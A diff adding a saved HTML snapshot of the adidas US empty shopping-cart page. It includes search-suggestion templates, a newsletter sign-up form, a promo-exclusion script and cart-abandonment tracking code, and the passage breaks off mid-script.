+<? var columnPos = 0;?>
+<? if (suggestions && suggestions.length || categories && categories.length) {?>
+<div class="column" data-column-num="<?=columnPos++?>">
+<div class="headline">Suggestions</div>
+<ul class="suggestions-list">
+<? for(var i = 0; i < suggestions.length; i++ ) {
+var item = suggestions[i];
+?>
+<li class="suggestion" data-row-num="<?=i?>">
+<a href="<?=appendParamToURL('http://www.adidas.com/us/search', 'q', item.suggestion)?>"><?=item.suggestion?></a>
+</li>
+<? } ?>
+<? for(j = 0; j < categories.length; j++) {
+var item = categories[j];
+?>
+<li class="category" data-row-num="<?=i+j?>">
+<a href="<?='//'+item.url?>"><?=item.suggestion?></a>
+</li>
+<? } ?>
+</ul>
+</div>
+<? } ?>
+<? if (products && products.length) {?>
+<div class="column products" data-column-num="<?=columnPos++?>">
+<div class="headline">Products</div>
+<ul>
+<?
+var numberOfStars = 5;
+for(var i = 0, r = 0; i < products.length; i++, r++) {
+var item = products[i];
+?>
+<? if (i === 4.0) {
+r = 0;
+?>
+</ul>
+</div>
+<div class="column products" data-column-num="<?=columnPos++?>">
+<div class="headline">&nbsp;</div>
+<ul>
+<? } ?>
+<li class="product" data-row-num="<?=r?>">
+<a class="product-in" href="<?=item.url?>">
+<img class="column-product-image" src="<?=item.image?>"/>
+<span class="column-product-data">
+<span class="column-product-suggestion">
+<?=item.suggestion?>
+</span>
+<span class="column-product-subtitle">
+<?=item.subTitle?>
+</span>
+
+<span class="column-product-price">
+<? var separatedSalePrice = JSON.parse(item.separatedSalePrice);
+var separatedStandartPrice = JSON.parse(item.separatedStandartPrice);
+?>
+<span <? if (separatedStandartPrice) { ?> class="column-product-price-new"<? } ?>>
+<?
+for(var j = 0; j < separatedSalePrice.length; j++) {
+var salePriceItem = separatedSalePrice[j];
+?>
+<span class="<?=(salePriceItem.isCurrency) ? 'currency-sign' : 'sale-price'?>">
+<?=salePriceItem.value?>
+</span>
+<? } ?>
+</span>
+<? if (separatedStandartPrice) { ?>
+<span class="column-product-price-old">
+<?
+for(var k = 0; k < separatedStandartPrice.length; k++) {
+var standartPriceItem = separatedStandartPrice[k];
+?>
+<span class="<?=(standartPriceItem.isCurrency) ? 'currency-sign' : 'sale-price'?>">
+<?=standartPriceItem.value?>
+</span>
+<? } ?>
+</span>
+<? } ?>
+</span>
+
+
+<?
+var avgRating = Math.round(item.rating);
+var percentage = Math.round(avgRating / numberOfStars * 100);
+?>
+<!-- rating -->
+<? if(percentage) { ?>
+<div class="rating-stars-container">
+<ul class="rating-stars rating-stars-empty"><? for( var star = 0; star < numberOfStars; star ++ ) { ?><li></li><? } ?></ul>
+<ul class="rating-stars rating-stars-filled" style="width:<?=percentage?>%;"><? for( var star = 0; star < numberOfStars; star ++ ) { ?><li></li><? } ?></ul>
+</div>
+<? } ?>
+<!-- /rating -->
+<span class="rating-stars-count"><?=item.reviews?></span>
+
+</span>
+</a>
+</li>
+<? } ?>
+</ul>
+</div>
+<? } ?>
+</div>
+</script>
+</div>
+
+</div>
+
+      </div>
+    </div>
+  </div>
+
+</div>
+
+
+
+
+<div id="consent_blackbar"></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="signupAndSaveContainer" style="display:none" >
+    <div id="signAndSaveDialog"
+    data-component="common/SignUpAndSaveOverlay"
+    data-showoverlayonxpage="2"
+    data-ignorecountforhttps="true"
+    data-ignorecountforurls="Cart-Show,Newsletter-Subscribe,bestofsport,best_of_sport,frontrow,nmd,originals,running,neo,soccer,basketball,football,baseball,training,skateboarding,snowboarding,nmd"
+    data-ignorecountforurlparams="cgid=kids"
+    >
+        <div class="signupform">
+          <div class="newsletter_signup_layer_one">
+
+          </div>
+          <div class="newsletter_signup_layer_two" style="display:block">
+          <h3 class="signup-and-save-header" data-text="Sign up for news &amp; get &lt;span&gt;15% off&lt;/span&gt;">
+            Sign up for news & get <span>15% off</span>
+          </h3>
+          <div class="newsletter_signup_form">
+            <form id="signupandsaveform" action="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Newsletter-Submits" method="post" data-component="form/Form" class='fancyform email_signup' novalidate="novalidate">
+              <fieldset>
+                <div class="general_error"></div>
+                <div class=" formfield email ">
+                  <input
+                    type="text"
+                    class='textinput required focusout'
+                    id="dwfrm_profile_customer_email"
+                    name="email"
+                    placeholder="Your email address"
+                    value=''
+                  />
+                  <div class="errormsg" data-empty-error="Please enter a valid e-mail address"></div>
+                  <input type="hidden" name="storetypetemplate" value="" />
+                  <input type="hidden" name="signup_source" value="overlay" />
+                </div>
+              </fieldset>
+              <fieldset>
+                <div class="js_consents signupandsave">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="birthday_wrapper clearfix">
+
+<div class="formfield birthday clearfix  mandatory" id="birthday-field-original">
+
+
+
+
+
+<label class="label-manual">
+
+Date of Birth
+
+<span class="label">&nbsp;*&nbsp;</span>
+
+</label>
+
+
+
+
+<!--  -->
+<div class="value value-select">
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_dayofmonth">Day</label>
+<select class="required" name="dwfrm_profile_customer_birthday_dayofmonth" id="dwfrm_profile_customer_birthday_dayofmonth"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Day</option>
+
+
+<option  value="1">1</option>
+
+
+<option  value="2">2</option>
+
+
+<option  value="3">3</option>
+
+
+<option  value="4">4</option>
+
+
+<option  value="5">5</option>
+
+
+<option  value="6">6</option>
+
+
+<option  value="7">7</option>
+
+
+<option  value="8">8</option>
+
+
+<option  value="9">9</option>
+
+
+<option  value="10">10</option>
+
+
+<option  value="11">11</option>
+
+
+<option  value="12">12</option>
+
+
+<option  value="13">13</option>
+
+
+<option  value="14">14</option>
+
+
+<option  value="15">15</option>
+
+
+<option  value="16">16</option>
+
+
+<option  value="17">17</option>
+
+
+<option  value="18">18</option>
+
+
+<option  value="19">19</option>
+
+
+<option  value="20">20</option>
+
+
+<option  value="21">21</option>
+
+
+<option  value="22">22</option>
+
+
+<option  value="23">23</option>
+
+
+<option  value="24">24</option>
+
+
+<option  value="25">25</option>
+
+
+<option  value="26">26</option>
+
+
+<option  value="27">27</option>
+
+
+<option  value="28">28</option>
+
+
+<option  value="29">29</option>
+
+
+<option  value="30">30</option>
+
+
+<option  value="31">31</option>
+
+</select>
+
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_month">Month</label>
+<select class="required" name="dwfrm_profile_customer_birthday_month" id="dwfrm_profile_customer_birthday_month"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Month</option>
+
+
+<option  value="0">1</option>
+
+
+<option  value="1">2</option>
+
+
+<option  value="2">3</option>
+
+
+<option  value="3">4</option>
+
+
+<option  value="4">5</option>
+
+
+<option  value="5">6</option>
+
+
+<option  value="6">7</option>
+
+
+<option  value="7">8</option>
+
+
+<option  value="8">9</option>
+
+
+<option  value="9">10</option>
+
+
+<option  value="10">11</option>
+
+
+<option  value="11">12</option>
+
+</select>
+
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_year">Year</label>
+<select class="required" name="dwfrm_profile_customer_birthday_year" id="dwfrm_profile_customer_birthday_year"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Year</option>
+
+
+
+
+<option  value="2016">2016</option>
+
+
+
+<option  value="2015">2015</option>
+
+
+
+<option  value="2014">2014</option>
+
+
+
+<option  value="2013">2013</option>
+
+
+
+<option  value="2012">2012</option>
+
+
+
+<option  value="2011">2011</option>
+
+
+
+<option  value="2010">2010</option>
+
+
+
+<option  value="2009">2009</option>
+
+
+
+<option  value="2008">2008</option>
+
+
+
+<option  value="2007">2007</option>
+
+
+
+<option  value="2006">2006</option>
+
+
+
+<option  value="2005">2005</option>
+
+
+
+<option  value="2004">2004</option>
+
+
+
+<option  value="2003">2003</option>
+
+
+
+<option  value="2002">2002</option>
+
+
+
+<option  value="2001">2001</option>
+
+
+
+<option  value="2000">2000</option>
+
+
+
+<option  value="1999">1999</option>
+
+
+
+<option  value="1998">1998</option>
+
+
+
+<option  value="1997">1997</option>
+
+
+
+<option  value="1996">1996</option>
+
+
+
+<option  value="1995">1995</option>
+
+
+
+<option  value="1994">1994</option>
+
+
+
+<option  value="1993">1993</option>
+
+
+
+<option  value="1992">1992</option>
+
+
+
+<option  value="1991">1991</option>
+
+
+
+<option  value="1990">1990</option>
+
+
+
+<option  value="1989">1989</option>
+
+
+
+<option  value="1988">1988</option>
+
+
+
+<option  value="1987">1987</option>
+
+
+
+<option  value="1986">1986</option>
+
+
+
+<option  value="1985">1985</option>
+
+
+
+<option  value="1984">1984</option>
+
+
+
+<option  value="1983">1983</option>
+
+
+
+<option  value="1982">1982</option>
+
+
+
+<option  value="1981">1981</option>
+
+
+
+<option  value="1980">1980</option>
+
+
+
+<option  value="1979">1979</option>
+
+
+
+<option  value="1978">1978</option>
+
+
+
+<option  value="1977">1977</option>
+
+
+
+<option  value="1976">1976</option>
+
+
+
+<option  value="1975">1975</option>
+
+
+
+<option  value="1974">1974</option>
+
+
+
+<option  value="1973">1973</option>
+
+
+
+<option  value="1972">1972</option>
+
+
+
+<option  value="1971">1971</option>
+
+
+
+<option  value="1970">1970</option>
+
+
+
+<option  value="1969">1969</option>
+
+
+
+<option  value="1968">1968</option>
+
+
+
+<option  value="1967">1967</option>
+
+
+
+<option  value="1966">1966</option>
+
+
+
+<option  value="1965">1965</option>
+
+
+
+<option  value="1964">1964</option>
+
+
+
+<option  value="1963">1963</option>
+
+
+
+<option  value="1962">1962</option>
+
+
+
+<option  value="1961">1961</option>
+
+
+
+<option  value="1960">1960</option>
+
+
+
+<option  value="1959">1959</option>
+
+
+
+<option  value="1958">1958</option>
+
+
+
+<option  value="1957">1957</option>
+
+
+
+<option  value="1956">1956</option>
+
+
+
+<option  value="1955">1955</option>
+
+
+
+<option  value="1954">1954</option>
+
+
+
+<option  value="1953">1953</option>
+
+
+
+<option  value="1952">1952</option>
+
+
+
+<option  value="1951">1951</option>
+
+
+
+<option  value="1950">1950</option>
+
+
+
+<option  value="1949">1949</option>
+
+
+
+<option  value="1948">1948</option>
+
+
+
+<option  value="1947">1947</option>
+
+
+
+<option  value="1946">1946</option>
+
+
+
+<option  value="1945">1945</option>
+
+
+
+<option  value="1944">1944</option>
+
+
+
+<option  value="1943">1943</option>
+
+
+
+<option  value="1942">1942</option>
+
+
+
+<option  value="1941">1941</option>
+
+
+
+<option  value="1940">1940</option>
+
+
+
+<option  value="1939">1939</option>
+
+
+
+<option  value="1938">1938</option>
+
+
+
+<option  value="1937">1937</option>
+
+
+
+<option  value="1936">1936</option>
+
+
+
+<option  value="1935">1935</option>
+
+
+
+<option  value="1934">1934</option>
+
+
+
+<option  value="1933">1933</option>
+
+
+
+<option  value="1932">1932</option>
+
+
+
+<option  value="1931">1931</option>
+
+
+
+<option  value="1930">1930</option>
+
+
+
+<option  value="1929">1929</option>
+
+
+
+<option  value="1928">1928</option>
+
+
+
+<option  value="1927">1927</option>
+
+
+
+<option  value="1926">1926</option>
+
+
+
+<option  value="1925">1925</option>
+
+
+
+<option  value="1924">1924</option>
+
+
+
+<option  value="1923">1923</option>
+
+
+
+<option  value="1922">1922</option>
+
+
+
+<option  value="1921">1921</option>
+
+
+
+<option  value="1920">1920</option>
+
+
+
+<option  value="1919">1919</option>
+
+
+
+<option  value="1918">1918</option>
+
+
+
+<option  value="1917">1917</option>
+
+
+
+<option  value="1916">1916</option>
+
+</select>
+
+
+</div>
+
+
+
+<a class="asking_button" data-component="common/ShowDialog" title="">?</a>
+<div class="ui-dialog asking">
+  <a class="close cancel" title="Close">Close</a>
+  <p>adidas collects date of birth to comply with the Privacy Policy</p>
+  <button class="cancel button-primary bp-black light-back co-btn_primary btn_tertiary btn-regular-dark btn btn-dark" type="button" title="Close"><span>Close</span></button>
+</div>
+
+
+
+<span class="errormessage" style="display:none;"></span>
+
+
+
+<div class="errormsg-wrap">
+<span class="errormsg hidden">Date of birth is a required field</span>
+</div>
+
+</div>
+
+</div>
+
+                </div>
+
+                <div class="formactions">
+
+
+                  <input type="hidden" name="gender" value="0"/>
+                  <div class="gender clearfix">
+                    <input type="hidden" name="gender" value="0"/>
+
+                      <input type="radio" name="dwfrm_profile_customer_gender" value="1" id="genderMale"><label for="genderMale">Male</label>
+                      <input type="radio" name="dwfrm_profile_customer_gender" value="2" id="genderFemale"><label for="genderFemale">Female</label>
+
+                  </div>
+                  <button class="button-primary bp-blue light-back co-btn_primary btn-regular-red full-width btn btn-red" type="submit"  name="dwfrm_profile_subscribe" value="Submit" tabindex='0'><span>Sign Up</span></button>
+
+                  <div class="subscribefull">
+
+
+  <p class="legal-copy-content">Sign me up for adidas emails, featuring exclusive offers, latest product info, news about upcoming events, and more. See our <a href="/us/help-topics-privacy_policy.html" target=_blank>Privacy Policy</a> for details.</p>
+  <script type="text/template" id="legalcontentpopup">
+    <div class="signupandsavedialog"></div>
+  </script>
+
+
+                  </div>
+                </div>
+              </fieldset>
+            </form>
+          </div>
+          <div class="signupandsave_complete">
+            <h3>Sign Up Complete</h3>
+            <p></p>
+          </div>
+          <div class="loading_wrapper">
+            <div class="loading">&nbsp;</div>
+          </div>
+        </div>
+      </div>
+      <div class="interstitial"></div>
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="main">
+<div id="content">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div id="live-chat-container" data-component="common/ReactiveChat" data-site-brand="Adidas" data-provider="rightnow" data-locale-chat="gb" data-salesforce-profile="-;-;-" data-salesforce-size="500;500">
+    <div id="live-chat-placeholder"></div>
+  </div>
+
+
+
+
+
+
+<!-- START cart-wrapper -->
+<div class="cart-wrapper row" data-component="pagecontext/Scope" data-scope="none">
+<div class="container clearfix empty-cart">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="col-8">
+
+<div class="container cart-head-container clearfix">
+<div class="col-4 title-wrapper" data-scope="breadcrumbs" data-context="home;shopping cart">
+<h1 class="checkout-title">Your Bag is Empty</h1>
+
+</div>
+</div>
+<div class="cart_empty-content">
+
+
+
+
+
+
+
+
+</div>
+<div class="contionue-shopping-wrapper">
+<form class="co-formcontinueshopping" action="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show/Destroyer" method="post" id="dwfrm_cart_d0nhurhtdcuo">
+<fieldset>
+<button class="rbk-button-red button-primary bp-black right" type="submit" value="Continue Shopping" name="dwfrm_cart_continueShopping">
+<span>Continue Shopping</span>
+</button>
+</fieldset>
+</form>
+</div>
+
+<div class="cart-teamwear-config">
+
+<div class="unfinished-teamwear-config" style="display:none;">
+  <div class="unfinished-teamwear-config-content-wrapper">
+    <div class="unfinished-teamwear-message">This product is saved, but not added to your bag</div>
+    <div class="section-title">Men Football teamwear</div>
+    <div class="teamwear-creation-time">
+      Created on
+      <span class="teamwear-creation date"></span>
+      at
+      <span class="teamwear-creation time"></span>
+    </div>
+    <div class="buttons">
+      <a class="cart-link-button action-teamwear-edit" href="/on/demandware.store/Sites-adidas-US-Site/en_US/Teamwear-Show">Edit</a>
+      <span class="separate-sumbol">|</span>
+      <a class="cart-link-button action-teamwear-delete" href="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show">Delete</a>
+    </div>
+    <div class="players clearfix">
+    </div>
+  </div>
+</div>
+
+
+</div>
+</div>
+<div class="cart-right col-4 co-delivery-right vertical-callout-container rbk-mobile-shadow-block">
+<div class="co-checkout-bottom-asset delivery-methods-content">
+
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="checkout-bottom-asset" data-contentasset="checkout-bottom-asset">
+<style>
+div.callout-bar.hockeycard { display: none; }
+</style>
+
+<div class="bottom-asset-wrapp">
+<h4>Need Help?</h4>
+<a _dialogtitle="Shipping" data-dialogclass="pt_customerservice" data-component="common/Popup" data-height="600" data-width="900" href="/us/help-topics-shipping.html">Shipping</a><br />
+<!-- <a href="/us/help-topics-delivery_terms.html">Delivery Help</a><br /> -->
+<a _dialogtitle="Returns & Exchanges" data-dialogclass="pt_customerservice" data-component="common/Popup" data-height="600" data-width="600" href="/us/help-topics-returning.html">Returns & Exchanges</a><br />
+<a _dialogtitle="Contact Us" data-dialogclass="pt_customerservice" data-component="common/Popup" data-height="600" data-width="600" href="/us/help-topics-Contact+Us.html">Contact Us</a></div>
+
+<div class="bottom-asset-wrapp">
+<h4>Accepted Payment Methods</h4>
+<img alt="payment methods" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw5656dbb3/us_payment_methods.png" /></div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+<div class="callout-bars clear clearfix">
+
+
+
+
+</div>
+<div id="cart-bottom-2-slot">
+<div class="rbk_wrapper">
+
+
+
+
+
+
+
+<div class="htmlslotcontainer">
+
+
+      <script type="text/javascript">
+
+//Array of products excluded from promotions
+
+var excludedProducts = ["011040","015110","034563","036516","280647","288022","463655","772109","AA0110","AA0114","AA0134","AA0137","AA0138","AA0147","AA0148","AA0149","AA0353","AA0814","AA0830","AA0833","AA0850","AA0851","AA0854","AA0855","AA5285","AA5784","AA6437","AA8744","AB7534","AB7535","AB9704","AB9706","AB9715","AB9717","AC0323","AC2723","AC2724","AC2727","AC2728","AC2837","AC2838","AC2841","AC2842","AC2849","AC5415","AC5580","AC5983","AC6614","AC8741","AF4110","AF4114","AF4116","AF4688","AF4693","AF4856","AF4858","AF4917","AF4918","AF4920","AF4921","AF4935","AF4936","AF5085","AF5140","AF5141","AF5142","AF5143","AF5477","AF5479","AF5480","AF5498","AF5499","AF5652","AF5666","AF5926","AF5945","AF5948","AF5949","AF6037","AF6163","AF6164","AF6396","AF6397","AF6516","AF6517","AF6518","AF6524","AF6525","AF6546","AF6547","AF6548","AF6551","AF6554","AF6555","AF6556","AF6557","AF6558","AF6562","AF6793","AF6794","AF6795","AF6796","AF6797","AH5144","AH9201","AI0330","AI0718","AI0721","AI0722","AI0723","AI0725","AI0728","AI1150","AI1151","AI1157","AI1158","AI4411","AI4748","AI5014","AJ1519","AJ1520","AJ1521","AJ1522","AJ1523","AJ1524","AJ1532","AJ7003","AJ9249","AJ9252","AK0049","AO0946","AO1507","AO3343","AO3345","AO3346","AO3468","AO3691","AP4309","AP4316","AP7836","AP7908","AQ1865","AQ1869","AQ2088","AQ2663","AQ2925","AQ2926","AQ2927","AQ2928","AQ2929","AQ2931","AQ3153","AQ3155","AQ3305","AQ4002","AQ4003","AQ4004","AQ4005","AQ4006","AQ4007","AQ4445","AQ5000","AQ5038","AQ5152","AQ5166","AQ5221","AQ5222","AQ5223","AQ5232","AQ5236","AQ5238","AQ5268","AQ5302","AQ5305","AQ5329","AQ5330","AQ5331","AQ5332","AQ5349","AQ5350","AQ5353","AQ5354","AQ5366","AQ5368","AQ5401","AQ5402","AQ5444","AQ5445","AQ5446","AQ5517","AQ5557","AQ5558","AQ5559","AQ5560","AQ5561","AQ5654","AQ6300","AQ6301","AQ6680","AQ6681","AQ6682","AQ6690","AQ6692","AQ6693","AQ6694","AQ6698","AQ6701","AQ6710","AQ6761","AQ6762","AQ6763","AQ6765","AQ6766","AQ6767","AQ6768","AQ6771","AQ6772","AQ6775","AQ6776","AQ6787","AQ6827","B22863","B22864","B22866","B22870","B22872","B23068","B23150","B23151","B23152","B23155","B23158","B23641","B23642","B24105","B24471","B25724","B26154","B26586","B26603","B27136","B27140","B32703","B33185","B33380","B33383","B33385","B33451","B33452","B33481","B33482","B33484","B33485","B33603","B33605","B33609","B33614","B33615","B33700","B33703","B33704","B33746","B34048","B34053","B34373","B34594","B35956","B44231","B44232","BA8594","C75323","C77124","C77153","C77154","G17100","G17102","G75090","G76792","G83963","G99863","G99864","M19838","M20324","M20325","M20327","M20605","M20607","M21574","M21865","M22456","M25733","M29320","M29324","M33704","M33705","M36013","M36019","M62761","M62766","S08905","S22772","S22775","S41896","S42064","S42065","S42067","S74425","S74426","S74427","S74430","S74431","S74462","S74464","S74465","S74466","S74574","S74575","S74596","S74679","S74778","S75104","S76531","S77414","S77415","S77416","S77417","S77510","S77512","S77513","S77514","S77515","S77551","S77586","S77588","S77623","S77625","S77847","S77848","S77850","S78257","S78394","S78395","S78453","S78456","S78493","S78494","S78495","S80258","S81451","S81804","S81805","S81806","S81809","S81810","S82692","S82693","S83338","S84596","S85066","S85139","Z51348","Z51350","S78391"];
+
+//Array to hold products added to cart
+var cartProducts = [];
+
+//Array to check if products added to cart belong to exclusions list
+var result = [];
+
+//Counter for results array
+var i;
+
+//Add article Id's to cartProducts Array
+  $("div.article span.value").each(function(){
+    cartProducts.push($(this).text());
+  });
+
+//Retrieve products in cart which are also part of exclusions list
+  result = ($.map(cartProducts,function(a){return $.inArray(a, excludedProducts) < 0 ? null : a;}));
+
+//Add exclusions message to each item in the results Array
+  $.each(result, function(index,value){
+    $("div.article span.value").each(function(){
+      if($(this).text()==value){
+      $(this).append("<div id=\"product_exclusion_message\" style=\"color:red\">excluded from promos</div>");
+
+
+      };
+    });
+  });
+
+</script>
+
+
+</div>
+
+
+</div>
+</div>
+</div>
+</div>
+<div class="certona-cart-recommendation products-carousel">
+
+<!-- Change in productlist/components/productcarousel.isml -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--googleoff: all--><noindex>
+  <div class="hidden" data-component="pagecontext/Context">%7B%22certona%22%3A%7B%22emptycart_rr%22%3A%7B%22count%22%3A%2224%22%2C%22query%22%3Anull%7D%7D%7D</div>
+</noindex><!--googleon: all-->
+
+
+
+
+
+
+
+<div class="carousel-content-inner owl-carousel-content-inner clearfix fullwidth" data-contentasset='certona-empty-cart-recommendations' data-contentassetid='certona-empty-cart-recommendations'>
+
+
+
+
+
+        <h3 class="carousel-title dark-grey">
+
+          Looking for something?
+
+        </h3>
+
+
+
+
+</div>
+
+  <div class="owlcarousel-wrapper product-carousel-owl fullwidth" data-component="productlist/Plp">
+      <div
+        class="owl-carousel owl-theme"
+        data-component="common/OwlCarousel"
+        data-prop-nesteditemselector="hockeycard"
+
+
+          data-prop-nav="true"
+          data-prop-items="4.0"
+          data-prop-slideBy="4.0"
+
+            data-prop-margin="10"
+
+
+      >
+
+        <!-- show loading icon. -->
+
+          <img class="loading-small" src="/on/demandware.static/Sites-adidas-US-Site/-/default/dwba17e999/images/loading-small.gif" alt="" />
+
+        <div id="emptycart_rr">
+            <!-- Certona will load products in here. -->
+          </div>
+
+    </div>
+  </div>
+
+</div>
+</div>
+<div id="cart-top-slot" class="small-callout-container">
+
+
+
+
+</div>
+<div class="co-basket-bottom-asset">
+
+
+
+
+
+
+
+</div>
+<!-- Reebok checkout bottom content -->
+<div class="rbk_checkout_bottom">
+
+
+
+
+
+
+
+</div>
+<!-- END cart-wrapper -->
+<div id="loader" class="loader"></div>
+
+
+
+
+
+
+
+
+
+<!-- Report any requested source code -->
+
+
+<!-- Report the active source code -->
+
+
+
+
+<script type="text/json" data-component="package/RemovePopup"></script>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/json" data-component="analytics/Checkout"></script>
+
+</div>
+
+
+
+<script type="text/javascript">
+
+
+
+
+
+
+
+
+
+function createCYEvent(ocy){
+
+
+cy.Custom1="Guest";
+
+cy.CUSTOMERCODE = "8151298043";
+
+
+
+
+//define the base link for SeeWhy to use in the email
+var link = "www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-UpdateItems";
+position=1;
+
+//If there is a coupon attached to the basket, add it to the link. There can be only one coupon assigned to the basket
+
+cy.ReturnToLink = link;
+
+
+_cySetCYProperties(ocy);
+cy_getImageSrc();
+}//end function createCYEvent
+if(!cy.SUPPRESSDEFAULT && false){
+createCYEvent();
+}
+(function(){
+
+
+var firstName = $('#dwfrm_delivery_singleshipping_shippingAddress_addressFields_firstName');
+$('#dwfrm_delivery_singleshipping_shippingAddress_email_emailAddress,#dwfrm_login_email').on('change',function(ev){
+var customerName = firstName.val();
+var emailField = $(this);
+if((emailField.attr('name') == "dwfrm_delivery_singleshipping_shippingAddress_email_emailAddress") && true && !customerName.length){
+customerName = "Guest";
+}
+createCYEvent({ UserId: emailField.val(), Custom1: customerName });
+});
+
+})();
+
+</script>
+<!-- End SeeWhy setcheckoutvariables Code -->
+
+
+</div>
+
+
+<div id="checkout_footer" class="clearfix" data-component="common/footer/Footer">
+<div class="wrapper">
+<!-- Reebok checkout bottom content -->
+<div class="rbk_checkout_bottom">
+
+
+
+
+</div>
+</div>
+<div class="checkout-footer-copy">
+<div class="wrapper">
+
+
+
+
+
+
+<div class="htmlslotcontainer">
+
+
+      <style>
+#content > div.delivery-wrapper.row > div > div.col-4.co-delivery-right.vertical-callout-container > div.cart_wrapper.rbk_shadow_angle.rbk_wrapper_checkout.summary_wrapper > div.cart-calculation > div.couponbox > div{
+display:none;
+}
+</style>
+
+<div class="copy-wrapper">
+    <ol class="copy">
+        <li><a href="/us/help-topics-privacy_policy.html">Privacy Policy</a></li>
+        <li><a href="/us/help-topics-terms_and_conditions_footer.html">Terms and Conditions</a></li>
+        <li><p>&copy; 2016 adidas Group</p></li>
+    </ol>
+</div>
+
+<script type="text/javascript">
+
+//Array of products excluded from promotions
+
+var excludedProducts = ["011040","015110","034563","036516","280647","288022","463655","772109","AA0110","AA0114","AA0134","AA0137","AA0138","AA0147","AA0148","AA0149","AA0353","AA0814","AA0830","AA0833","AA0850","AA0851","AA0854","AA0855","AA5285","AA5784","AA6437","AA8744","AB7534","AB7535","AB9704","AB9706","AB9715","AB9717","AC0323","AC2723","AC2724","AC2727","AC2728","AC2837","AC2838","AC2841","AC2842","AC2849","AC5415","AC5580","AC5983","AC6614","AC8741","AF4110","AF4114","AF4116","AF4688","AF4693","AF4856","AF4858","AF4917","AF4918","AF4920","AF4921","AF4935","AF4936","AF5085","AF5140","AF5141","AF5142","AF5143","AF5477","AF5479","AF5480","AF5498","AF5499","AF5652","AF5666","AF5926","AF5945","AF5948","AF5949","AF6037","AF6163","AF6164","AF6396","AF6397","AF6516","AF6517","AF6518","AF6524","AF6525","AF6546","AF6547","AF6548","AF6551","AF6554","AF6555","AF6556","AF6557","AF6558","AF6562","AF6793","AF6794","AF6795","AF6796","AF6797","AH5144","AH9201","AI0330","AI0718","AI0721","AI0722","AI0723","AI0725","AI0728","AI1150","AI1151","AI1157","AI1158","AI4411","AI4748","AI5014","AJ1519","AJ1520","AJ1521","AJ1522","AJ1523","AJ1524","AJ1532","AJ7003","AJ9249","AJ9252","AK0049","AO0946","AO1507","AO3343","AO3345","AO3346","AO3468","AO3691","AP4309","AP4316","AP7836","AP7908","AQ1865","AQ1869","AQ2088","AQ2663","AQ2925","AQ2926","AQ2927","AQ2928","AQ2929","AQ2931","AQ3153","AQ3155","AQ3305","AQ4002","AQ4003","AQ4004","AQ4005","AQ4006","AQ4007","AQ4445","AQ5000","AQ5038","AQ5152","AQ5166","AQ5221","AQ5222","AQ5223","AQ5232","AQ5236","AQ5238","AQ5268","AQ5302","AQ5305","AQ5329","AQ5330","AQ5331","AQ5332","AQ5349","AQ5350","AQ5353","AQ5354","AQ5366","AQ5368","AQ5401","AQ5402","AQ5444","AQ5445","AQ5446","AQ5517","AQ5557","AQ5558","AQ5559","AQ5560","AQ5561","AQ5654","AQ6300","AQ6301","AQ6680","AQ6681","AQ6682","AQ6690","AQ6692","AQ6693","AQ6694","AQ6698","AQ6701","AQ6710","AQ6761","AQ6762","AQ6763","AQ6765","AQ6766","AQ6767","AQ6768","AQ6771","AQ6772","AQ6775","AQ6776","AQ6787","AQ6827","B22863","B22864","B22866","B22870","B22872","B23068","B23150","B23151","B23152","B23155","B23158","B23641","B23642","B24105","B24471","B25724","B26154","B26586","B26603","B27136","B27140","B32703","B33185","B33380","B33383","B33385","B33451","B33452","B33481","B33482","B33484","B33485","B33603","B33605","B33609","B33614","B33615","B33700","B33703","B33704","B33746","B34048","B34053","B34373","B34594","B35956","B44231","B44232","BA8594","C75323","C77124","C77153","C77154","G17100","G17102","G75090","G76792","G83963","G99863","G99864","M19838","M20324","M20325","M20327","M20605","M20607","M21574","M21865","M22456","M25733","M29320","M29324","M33704","M33705","M36013","M36019","M62761","M62766","S08905","S22772","S22775","S41896","S42064","S42065","S42067","S74425","S74426","S74427","S74430","S74431","S74462","S74464","S74465","S74466","S74574","S74575","S74596","S74679","S74778","S75104","S76531","S77414","S77415","S77416","S77417","S77510","S77512","S77513","S77514","S77515","S77551","S77586","S77588","S77623","S77625","S77847","S77848","S77850","S78257","S78394","S78395","S78453","S78456","S78493","S78494","S78495","S80258","S81451","S81804","S81805","S81806","S81809","S81810","S82692","S82693","S83338","S84596","S85066","S85139","Z51348","Z51350","S78391"];
+
+//Array to hold products added to cart
+var cartProducts = [];
+
+//Array to check if products added to cart belong to exclusions list
+var result = [];
+
+//Counter for results array
+var i;
+
+//Add article Id's to cartProducts Array
+  $("div.article span.value").each(function(){
+    cartProducts.push($(this).text());
+  });
+
+//Retrieve products in cart which are also part of exclusions list
+  result = ($.map(cartProducts,function(a){return $.inArray(a, excludedProducts) < 0 ? null : a;}));
+
+//Add exclusions message to each item in the results Array
+  $.each(result, function(index,value){
+    $("div.article span.value").each(function(){
+      if($(this).text()==value){
